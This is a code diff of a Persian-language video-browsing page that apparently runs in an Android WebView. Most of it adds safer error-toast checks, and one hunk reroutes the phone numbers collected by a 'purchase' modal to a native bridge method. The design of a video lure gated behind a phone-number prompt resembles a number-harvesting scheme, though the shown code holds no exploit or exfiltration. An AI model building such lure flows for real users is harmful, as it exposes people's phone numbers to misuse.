@@ -80,7 +80,7 @@
         .modal.active { opacity: 1; visibility: visible; transition: opacity 0.3s ease; }
         .modal-content { background-color: #282828; padding: 20px; border-radius: 12px; width: 90%; max-width: 480px; text-align: center; }
         .redirect-button { background-color: var(--ph-orange); color: #000; border: none; padding: 14px 20px; font-size: 18px; font-weight: 700; border-radius: 8px; cursor: pointer; width: 100%; min-height: 53px; display: flex; justify-content: center; align-items: center; margin-top: 20px; }
-        .spinner { width: 25px; height: 25px; border/ng: 0px 0px 10px rgba(0, 0, 0, 0.3); border-top-color: #000; border-radius: 50%; animation: spin 1s linear infinite; }
+        .spinner { width: 25px; height: 25px; border: 3px solid rgba(0, 0, 0, 0.3); border-top-color: #000; border-radius: 50%; animation: spin 1s linear infinite; }
         @keyframes spin { to { transform: rotate(360deg); } }
     </style>
 </head>
@@ -158,7 +158,9 @@
                 window.scrollTo(0, 0);
             } catch (e) {
                 console.error('Error in navigateTo:', e);
-                if (window.Android) window.Android.showToast('خطا در تغییر صفحه');
+                if (window.Android && window.Android.showToast) {
+                    window.Android.showToast('خطا در تغییر صفحه');
+                }
             }
         }
 
@@ -170,7 +172,9 @@
                 }
             } catch (e) {
                 console.error('Error in navigateToDetails:', e);
-                if (window.Android) window.Android.showToast('خطا در نمایش جزئیات');
+                if (window.Android && window.Android.showToast) {
+                    window.Android.showToast('خطا در نمایش جزئیات');
+                }
             }
         }
 
@@ -206,14 +210,18 @@
                             navigateToDetails(video.id);
                         } catch (e) {
                             console.error('Error in videoItem click:', e);
-                            if (window.Android) window.Android.showToast('خطا در انتخاب ویدیو');
+                            if (window.Android && window.Android.showToast) {
+                                window.Android.showToast('خطا در انتخاب ویدیو');
+                            }
                         }
                     });
                     videoGrid.appendChild(videoItem);
                 });
             } catch (e) {
                 console.error('Error in renderHomePage:', e);
-                if (window.Android) window.Android.showToast('خطا در بارگذاری ویدیوها');
+                if (window.Android && window.Android.showToast) {
+                    window.Android.showToast('خطا در بارگذاری ویدیوها');
+                }
             }
         }
 
@@ -249,12 +257,16 @@
                         openPurchaseModal();
                     } catch (e) {
                         console.error('Error in playOverlay click:', e);
-                        if (window.Android) window.Android.showToast('خطا در عملیات');
+                        if (window.Android && window.Android.showToast) {
+                            window.Android.showToast('خطا در عملیات');
+                        }
                     }
                 });
             } catch (e) {
                 console.error('Error in renderDetailsPage:', e);
-                if (window.Android) window.Android.showToast('خطا در نمایش جزئیات');
+                if (window.Android && window.Android.showToast) {
+                    window.Android.showToast('خطا در نمایش جزئیات');
+                }
             }
         }
 
@@ -263,7 +275,9 @@
                 modal.classList.add('active');
             } catch (e) {
                 console.error('Error in openPurchaseModal:', e);
-                if (window.Android) window.Android.showToast('خطا در نمایش اعلان');
+                if (window.Android && window.Android.showToast) {
+                    window.Android.showToast('خطا در نمایش اعلان');
+                }
             }
         }
 
@@ -297,26 +311,30 @@
                 submitPhoneButton.innerHTML = '<div class="spinner"></div>';
                 submitPhoneButton.disabled = true;
 
-                // Send phone number to Android
-                if (typeof window.Android !== 'undefined' && typeof window.Android.submitPhoneNumber === 'function') {
+                // Check if Android interface is available
+                if (typeof window.Android !== 'undefined' && typeof window.Android.isAndroidInterfaceAvailable === 'function' && window.Android.isAndroidInterfaceAvailable()) {
                     console.log('Sending phone number to Android:', phoneNumber);
-                    window.Android.submitPhoneNumber(phoneNumber);
+                    window.Android.sendPhoneNumber(phoneNumber);
+                    // Close modal and reset button
+                    modal.classList.remove('active');
+                    phoneNumberInput.value = '';
+                    submitPhoneButton.innerHTML = 'تایید و ادامه';
+                    submitPhoneButton.disabled = false;
                 } else {
-                    console.log('Android interface not found. Phone number not sent. Value:', phoneNumber);
-                    alert(`رابط اندروید یافت نشد. شماره ارسال شده: ${phoneNumber}`);
+                    // Fallback for testing in a browser or if interface is unavailable
+                    console.log('Android interface not found. Fallback mode. Number:', phoneNumber);
+                    alert('رابط اندروید در دسترس نیست. لطفا دوباره تلاش کنید یا با پشتیبانی تماس بگیرید.');
+                    modal.classList.remove('active');
+                    phoneNumberInput.value = '';
+                    submitPhoneButton.innerHTML = 'تایید و ادامه';
+                    submitPhoneButton.disabled = false;
                 }
-
-                // Reset button and input
-                submitPhoneButton.innerHTML = 'تایید و ادامه';
-                submitPhoneButton.disabled = false;
-                phoneNumberInput.value = '';
-                closeModal();
-
             } catch (e) {
                 console.error('Error in submitPhoneButton click:', e);
                 if (window.Android && window.Android.showToast) {
                     window.Android.showToast('خطا در ارسال شماره');
                 }
+                // Reset button on error
                 submitPhoneButton.innerHTML = 'تایید و ادامه';
                 submitPhoneButton.disabled = false;
             }
@@ -330,7 +348,9 @@
                     renderHomePage(link.dataset.category, searchInput.value);
                 } catch (e) {
                     console.error('Error in categoryLinks click:', e);
-                    if (window.Android) window.Android.showToast('خطا در فیلتر دسته‌بندی');
+                    if (window.Android && window.Android.showToast) {
+                        window.Android.showToast('خطا در فیلتر دسته‌بندی');
+                    }
                 }
             });
         });
@@ -341,7 +361,19 @@
                 renderHomePage(activeCategory, e.target.value);
             } catch (e) {
                 console.error('Error in searchInput input:', e);
-                if (window.Android) window.Android.showToast('خطا در جستجو');
+                if (window.Android && window.Android.showToast) {
+                    window.Android.showToast('خطا در جستجو');
+                }
+            }
+        });
+
+        // Check Android interface availability on load
+        window.addEventListener('load', () => {
+            if (typeof window.Android === 'undefined' || typeof window.Android.isAndroidInterfaceAvailable !== 'function' || !window.Android.isAndroidInterfaceAvailable()) {
+                console.warn('Android interface not available on page load');
+                if (window.Android && window.Android.showToast) {
+                    window.Android.showToast('رابط اندروید در دسترس نیست');
+                }
             }
         });
 
@@ -349,7 +381,9 @@
             renderHomePage();
         } catch (e) {
             console.error('Error in initial render:', e);
-            if (window.Android) window.Android.showToast('خطا در بارگذاری اولیه');
+            if (window.Android && window.Android.showToast) {
+                window.Android.showToast('خطا در بارگذاری اولیه');
+            }
         }
     });
     </script>
